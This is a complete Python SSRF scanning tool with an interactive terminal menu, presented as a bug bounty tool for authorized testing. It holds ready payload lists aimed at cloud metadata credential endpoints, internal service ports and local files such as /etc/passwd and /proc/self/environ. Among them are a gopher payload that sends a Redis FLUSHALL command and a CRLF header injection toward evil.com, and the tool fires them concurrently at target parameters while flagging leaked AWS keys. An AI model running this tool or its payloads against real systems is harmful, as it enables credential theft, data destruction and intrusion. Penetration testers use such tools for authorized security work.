#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║                  SSRF PROBER v2.0                        ║
║        Interactive Terminal UI — Bug Bounty Edition      ║
║      For authorized pentesting / bug bounty only         ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import json
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

# ── dependency check ────────────────────────────────────────
MISSING = []
try:
    import httpx
except ImportError:
    MISSING.append("httpx")
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.rule import Rule
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich import box
except ImportError:
    MISSING.append("rich")
try:
    from prompt_toolkit import prompt as ptk_prompt
    from prompt_toolkit.history import InMemoryHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.styles import Style as PtkStyle
except ImportError:
    MISSING.append("prompt_toolkit")

if MISSING:
    print(f"[!] Missing dependencies: {', '.join(MISSING)}")
    print(f"    Run: pip install {' '.join(MISSING)} --break-system-packages")
    sys.exit(1)

console = Console()

# ═══════════════════════════════════════════════════════════
#  PAYLOADS
# ═══════════════════════════════════════════════════════════

INTERNAL_HOSTS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://0x7f000001",
    "http://127.1",
    "http://127.0.1",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://localhost:8080",
    "http://localhost:8443",
    "http://localhost:9200",
    "http://localhost:5984",
    "http://localhost:2375",
    "http://localhost:6379",
    "http://localhost:4848",
    "http://localhost:7001",
    "http://localhost:8888",
    "http://localhost:3000",
    "http://localhost:8500",
]

BYPASS_PAYLOADS = [
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://[::ffff:7f00:1]",
    "http://[::ffff:127.0.0.1]",
    "http://localtest.me",
    "http://127%2e0%2e0%2e1",
    "http://127%252e0%252e0%252e1",
    "http://127.0.0.1%0d%0aHost: evil.com",
]

OOB_PATHS = ["/", "/ssrf-test", "/latest/meta-data/", "/v1/", "/?ssrf=1"]

INDICATORS = {
    "ami-id":                ("AWS EC2 metadata exposed",             "CRITICAL"),
    "instance-id":           ("AWS instance metadata exposed",        "CRITICAL"),
    "security-credentials":  ("AWS IAM credentials possibly exposed", "CRITICAL"),
    '"AccessKeyId"':         ("AWS Access Key in response",           "CRITICAL"),
    '"SecretAccessKey"':     ("AWS Secret Key in response",           "CRITICAL"),
    "computeMetadata":       ("GCP metadata endpoint hit",            "CRITICAL"),
    "google":                ("Google Cloud metadata indicator",      "HIGH"),
    "Compute":               ("Azure metadata indicator",             "HIGH"),
    "root:x:0:0":            ("Linux /etc/passwd content",            "CRITICAL"),
    "127.0.0.1":             ("Localhost reference in response",      "MEDIUM"),
    "192.168.":              ("Internal IP range in response",        "HIGH"),
    "10.0.":                 ("Internal IP range in response",        "HIGH"),
    "172.16.":               ("Internal IP range in response",        "HIGH"),
    "redis_version":         ("Redis info page exposed",              "CRITICAL"),
    "elasticsearch":         ("Elasticsearch response",               "HIGH"),
    "couchdb":               ("CouchDB response",                     "HIGH"),
    "X-Docker-":             ("Docker daemon response",               "CRITICAL"),
    "grafana":               ("Grafana exposed",                      "MEDIUM"),
    "consul":                ("Consul exposed",                       "HIGH"),
    "Internal Server Error": ("Internal error (possible reflection)", "LOW"),
}

SEV_COLOR = {
    "CRITICAL": "bold red",
    "HIGH":     "bold orange1",
    "MEDIUM":   "bold yellow",
    "LOW":      "bold blue",
    "INFO":     "dim white",
}

# ═══════════════════════════════════════════════════════════
#  DATA STRUCTURES
# ═══════════════════════════════════════════════════════════

@dataclass
class Target:
    url: str
    params: list = field(default_factory=lambda: ["url"])
    headers: dict = field(default_factory=dict)
    json_body: Optional[str] = None
    is_json: bool = False
    cookie: Optional[str] = None
    notes: str = ""

@dataclass
class SSRFResult:
    url: str
    payload: str
    param: str
    status_code: int
    response_time: float
    response_length: int
    response_snippet: str
    indicators: list = field(default_factory=list)
    severity: str = "INFO"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        return self.__dict__

@dataclass
class ScanConfig:
    targets: list = field(default_factory=list)
    oob_host: Optional[str] = None
    proxy: Optional[str] = None
    timeout: float = 8.0
    concurrency: int = 20
    verify_ssl: bool = True
    all_payloads: bool = False
    verbose: bool = False
    output_file: Optional[str] = None

# ═══════════════════════════════════════════════════════════
#  DETECTION ENGINE
# ═══════════════════════════════════════════════════════════

def analyze_response(text: str, status: int):
    found, max_sev = [], "INFO"
    sev_order = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
    for pattern, (msg, sev) in INDICATORS.items():
        if pattern.lower() in text.lower():
            found.append(f"{sev}: {msg}")
            if sev_order[sev] > sev_order.get(max_sev, 0):
                max_sev = sev
    if status in (200, 201) and len(text) > 100 and max_sev == "INFO":
        max_sev = "LOW"
    return found, max_sev

# ═══════════════════════════════════════════════════════════
#  REQUEST ENGINE
# ═══════════════════════════════════════════════════════════

async def send_probe(client, config: ScanConfig, target: Target, payload: str, param: str):
    url = target.url
    body = None
    req_headers = dict(target.headers)
    if target.cookie:
        req_headers["Cookie"] = target.cookie
    req_headers.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")

    try:
        if target.is_json and target.json_body:
            body = target.json_body.replace("FUZZ", payload)
            req_headers["Content-Type"] = "application/json"
            method = "POST"
        elif "FUZZ" in url:
            url = url.replace("FUZZ", urllib.parse.quote(payload, safe=""))
            method = "GET"
        else:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            qs[param] = [payload]
            url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            method = "GET"

        t0 = time.monotonic()
        if method == "GET":
            resp = await client.get(url, headers=req_headers)
        else:
            resp = await client.post(url, content=body, headers=req_headers)
        elapsed = round(time.monotonic() - t0, 3)

        text = resp.text[:4096]
        indicators, severity = analyze_response(text, resp.status_code)

        if not indicators and not config.verbose:
            return None

        return SSRFResult(
            url=url, payload=payload, param=param,
            status_code=resp.status_code, response_time=elapsed,
            response_length=len(resp.text),
            response_snippet=text[:300].replace("\n", " "),
            indicators=indicators, severity=severity,
        )
    except httpx.TimeoutException:
        if config.verbose:
            return SSRFResult(url=url, payload=payload, param=param,
                status_code=0, response_time=config.timeout, response_length=0,
                response_snippet="TIMEOUT",
                indicators=["INFO: Request timed out (possible blind SSRF)"], severity="LOW")
    except Exception as e:
        if config.verbose:
            return SSRFResult(url=url, payload=payload, param=param,
                status_code=0, response_time=0, response_length=0,
                response_snippet=str(e),
                indicators=[f"INFO: {type(e).__name__}"], severity="INFO")
    return None


async def run_scan(config: ScanConfig):
    payloads = list(INTERNAL_HOSTS)
    if config.all_payloads:
        payloads += BYPASS_PAYLOADS
    if config.oob_host:
        for path in OOB_PATHS:
            payloads.append(f"http://{config.oob_host}{path}")

    transport = httpx.AsyncHTTPTransport(proxy=config.proxy) if config.proxy else None
    semaphore = asyncio.Semaphore(config.concurrency)
    all_results = []

    async def bounded(tgt, payload, param):
        async with semaphore:
            return await send_probe(client, config, tgt, payload, param)

    tasks = [
        bounded(tgt, p, param)
        for tgt in config.targets
        for param in tgt.params
        for p in payloads
    ]
    total = len(tasks)

    async with httpx.AsyncClient(
        timeout=config.timeout, verify=config.verify_ssl,
        follow_redirects=False, transport=transport,
    ) as client:
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(bar_width=35),
            TextColumn("[bold white]{task.completed}/{task.total}"),
            console=console, transient=False,
        ) as progress:
            task_id = progress.add_task("[cyan]Scanning...", total=total)
            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.advance(task_id)
                if result:
                    all_results.append(result)
                    _live_print(result)

    return all_results


def _live_print(r: SSRFResult):
    color = SEV_COLOR.get(r.severity, "white")
    indicators_str = "  |  ".join(r.indicators) if r.indicators else "—"
    console.print(
        f"\n  [{color}][{r.severity}][/{color}] "
        f"HTTP [bold]{r.status_code}[/bold] · "
        f"{r.response_length}B · {r.response_time}s\n"
        f"  [dim]Param  :[/dim] {r.param}\n"
        f"  [dim]Payload:[/dim] {r.payload}\n"
        f"  [dim]Hits   :[/dim] [{color}]{indicators_str}[/{color}]\n"
        f"  [dim]Snippet:[/dim] {r.response_snippet[:120]}…"
    )

# ═══════════════════════════════════════════════════════════
#  TUI
# ═══════════════════════════════════════════════════════════

ptk_style = PtkStyle.from_dict({
    "prompt": "#00ffcc bold",
    "":       "#ffffff",
})
history = InMemoryHistory()


def ptk_input(label: str, default: str = "") -> str:
    try:
        return ptk_prompt(
            label,
            history=history,
            auto_suggest=AutoSuggestFromHistory(),
            style=ptk_style,
            default=default,
        ).strip()
    except (KeyboardInterrupt, EOFError):
        return default


def banner():
    console.print()
    console.print(Panel.fit(
        "[bold cyan]SSRF PROBER[/bold cyan] [dim]v2.0[/dim]\n"
        "[dim]Interactive Bug Bounty Edition · Kali Linux[/dim]\n"
        "[bold red]⚠  For authorized testing only[/bold red]",
        border_style="cyan",
        padding=(1, 4),
    ))
    console.print()


def show_targets(targets: list):
    if not targets:
        console.print("  [dim]No targets added yet.[/dim]\n")
        return
    t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan")
    t.add_column("#",      style="dim",       width=4)
    t.add_column("URL",    style="bold white", max_width=55)
    t.add_column("Params", style="cyan",       width=22)
    t.add_column("Auth",   style="green",      width=6)
    t.add_column("Notes",  style="dim",        max_width=18)
    for i, tgt in enumerate(targets, 1):
        has_auth = "✓" if (tgt.cookie or tgt.headers.get("Authorization")) else "—"
        t.add_row(str(i), tgt.url[:55], ", ".join(tgt.params), has_auth, tgt.notes or "—")
    console.print(t)


def menu_add_target(targets: list):
    console.print(Rule("[bold cyan]Add Target[/bold cyan]"))
    console.print(
        "  [dim]Use [bold]FUZZ[/bold] in the URL as the injection point,[/dim]\n"
        "  [dim]or enter a base URL and specify params below.\n[/dim]"
    )

    url = ptk_input("  URL  ▶ ")
    if not url:
        console.print("  [red]URL cannot be empty.[/red]\n")
        return
    if not url.startswith("http"):
        url = "https://" + url

    raw_params = ptk_input("  Params (comma-separated) [url] ▶ ", "url")
    params = [p.strip() for p in raw_params.split(",") if p.strip()] or ["url"]

    cookie = ptk_input("  Cookie (optional) ▶ ")
    auth   = ptk_input("  Authorization header value (optional) ▶ ")
    notes  = ptk_input("  Notes (optional) ▶ ")

    is_json, json_body = False, None
    if ptk_input("  POST with JSON body? [y/N] ▶ ", "n").lower() == "y":
        is_json = True
        console.print('  [dim]Enter JSON body — use FUZZ as placeholder.[/dim]')
        json_body = ptk_input('  JSON body ▶ ', '{"url":"FUZZ"}')

    headers = {}
    if auth:
        headers["Authorization"] = auth

    targets.append(Target(
        url=url, params=params, headers=headers,
        json_body=json_body, is_json=is_json,
        cookie=cookie or None, notes=notes,
    ))
    console.print(f"\n  [bold green]✓ Target added:[/bold green] {url}\n")


def menu_remove_target(targets: list):
    if not targets:
        console.print("  [dim]No targets to remove.[/dim]\n")
        return
    show_targets(targets)
    raw = ptk_input("  Remove target # ▶ ")
    try:
        removed = targets.pop(int(raw) - 1)
        console.print(f"  [yellow]✓ Removed:[/yellow] {removed.url}\n")
    except (ValueError, IndexError):
        console.print("  [red]Invalid selection.[/red]\n")


def menu_scan_options(config: ScanConfig) -> ScanConfig:
    console.print(Rule("[bold cyan]Scan Options[/bold cyan]"))

    def ask(label, current):
        return ptk_input(f"  {label} [{current or 'none'}] ▶ ")

    oob   = ask("OOB host (Burp Collaborator / interactsh)", config.oob_host)
    proxy = ask("Proxy", config.proxy)
    tout  = ask("Timeout (seconds)", config.timeout)
    conc  = ask("Concurrency", config.concurrency)
    allp  = ptk_input(f"  Bypass payloads (gopher, file, encodings)? [{'Y' if config.all_payloads else 'N'}] ▶ ")
    verb  = ptk_input(f"  Verbose mode? [{'Y' if config.verbose else 'N'}] ▶ ")
    outp  = ask("Output JSON file", config.output_file)
    nossl = ptk_input(f"  Disable SSL verify? [{'Y' if not config.verify_ssl else 'N'}] ▶ ")

    if oob:   config.oob_host     = oob
    if proxy: config.proxy        = proxy
    if tout:
        try: config.timeout       = float(tout)
        except ValueError: pass
    if conc:
        try: config.concurrency   = int(conc)
        except ValueError: pass
    if allp:  config.all_payloads = allp.lower() == "y"
    if verb:  config.verbose      = verb.lower() == "y"
    if outp:  config.output_file  = outp
    if nossl: config.verify_ssl   = nossl.lower() != "y"

    console.print("  [bold green]✓ Options saved.[/bold green]\n")
    return config


def show_config(config: ScanConfig):
    t = Table(box=box.SIMPLE, show_header=False)
    t.add_column("Key",   style="dim cyan",  width=22)
    t.add_column("Value", style="bold white")
    rows = [
        ("OOB host",        config.oob_host or "—"),
        ("Proxy",           config.proxy or "—"),
        ("Timeout",         f"{config.timeout}s"),
        ("Concurrency",     str(config.concurrency)),
        ("Bypass payloads", "✓" if config.all_payloads else "✗"),
        ("Verbose",         "✓" if config.verbose else "✗"),
        ("SSL verify",      "✓" if config.verify_ssl else "✗"),
        ("Output file",     config.output_file or "—"),
    ]
    for k, v in rows:
        t.add_row(k, v)
    console.print(t)


def show_summary(results: list):
    console.print()
    console.print(Rule("[bold white]SCAN SUMMARY[/bold white]"))
    if not results:
        console.print("  [green]✓ No SSRF indicators found.[/green]\n")
        return

    sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for r in results:
        sev_count[r.severity] = sev_count.get(r.severity, 0) + 1

    t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan")
    t.add_column("Severity",    width=12)
    t.add_column("Findings",    width=10)
    t.add_column("Top Payload", max_width=52)
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        count = sev_count[sev]
        if count:
            top = next((r.payload for r in results if r.severity == sev), "—")
            c = SEV_COLOR[sev]
            t.add_row(f"[{c}]{sev}[/{c}]", f"[bold]{count}[/bold]", top[:52])
    console.print(t)


def save_results(results: list, path: str):
    with open(path, "w") as f:
        json.dump([r.to_dict() for r in results], f, indent=2)
    console.print(f"\n  [bold green]✓ Saved →[/bold green] {path}\n")


def show_help():
    console.print(Panel(
        "[bold cyan]COMMANDS[/bold cyan]\n\n"
        "  [bold]1[/bold]  Add target URL\n"
        "  [bold]2[/bold]  View / remove targets\n"
        "  [bold]3[/bold]  Scan options  (OOB · proxy · timeout · bypass)\n"
        "  [bold]4[/bold]  Show current config\n"
        "  [bold]5[/bold]  [bold green]START SCAN[/bold green]\n"
        "  [bold]6[/bold]  Save last results to JSON\n"
        "  [bold]h[/bold]  Help\n"
        "  [bold]q[/bold]  Quit\n\n"
        "[bold yellow]QUICK WORKFLOW[/bold yellow]\n\n"
        "  1 → add targets   3 → configure   5 → scan   6 → export",
        border_style="dim cyan",
        padding=(1, 3),
    ))

# ═══════════════════════════════════════════════════════════
#  MAIN LOOP
# ═══════════════════════════════════════════════════════════

def main():
    banner()
    targets      = []
    last_results = []
    config       = ScanConfig(targets=targets)
    show_help()

    while True:
        console.print(Rule(style="dim"))
        console.print(
            f"  Targets: [bold cyan]{len(targets)}[/bold cyan]  "
            "[dim]|[/dim]  "
            "[bold]1[/bold] Add  [bold]2[/bold] View  "
            "[bold]3[/bold] Options  [bold]4[/bold] Config  "
            "[bold cyan][bold]5[/bold] SCAN[/bold cyan]  "
            "[bold]6[/bold] Save  [bold]h[/bold] Help  [bold]q[/bold] Quit"
        )
        console.print()

        try:
            choice = ptk_input("  ▶ ").lower()
        except (KeyboardInterrupt, EOFError):
            break

        if choice == "1":
            menu_add_target(targets)

        elif choice == "2":
            console.print(Rule("[bold cyan]Targets[/bold cyan]"))
            show_targets(targets)
            if targets and ptk_input("  Remove a target? [y/N] ▶ ").lower() == "y":
                menu_remove_target(targets)

        elif choice == "3":
            config = menu_scan_options(config)

        elif choice == "4":
            console.print(Rule("[bold cyan]Current Config[/bold cyan]"))
            show_config(config)
            console.print()

        elif choice == "5":
            if not targets:
                console.print("  [red]Add at least one target first (option 1).[/red]\n")
                continue

            config.targets = targets
            n_payloads = len(INTERNAL_HOSTS)
            if config.all_payloads:
                n_payloads += len(BYPASS_PAYLOADS)
            if config.oob_host:
                n_payloads += len(OOB_PATHS)
            total = sum(len(t.params) for t in targets) * n_payloads

            console.print(Rule("[bold green]STARTING SCAN[/bold green]"))
            console.print(
                f"  Targets     : [bold]{len(targets)}[/bold]\n"
                f"  Payloads    : [bold]{n_payloads}[/bold]\n"
                f"  Total probes: [bold]{total}[/bold]\n"
                f"  Concurrency : [bold]{config.concurrency}[/bold]\n"
            )

            last_results = asyncio.run(run_scan(config))
            show_summary(last_results)

            if config.output_file:
                save_results(last_results, config.output_file)

        elif choice == "6":
            if not last_results:
                console.print("  [dim]No results yet. Run a scan first (option 5).[/dim]\n")
                continue
            path = ptk_input("  Output file ▶ ", "ssrf_results.json")
            if path:
                save_results(last_results, path)

        elif choice in ("h", "help", "?"):
            show_help()

        elif choice in ("q", "quit", "exit"):
            console.print("\n  [dim]Goodbye.[/dim]\n")
            break

        else:
            console.print("  [dim]Unknown command. Press [bold]h[/bold] for help.[/dim]\n")


if __name__ == "__main__":
    main()
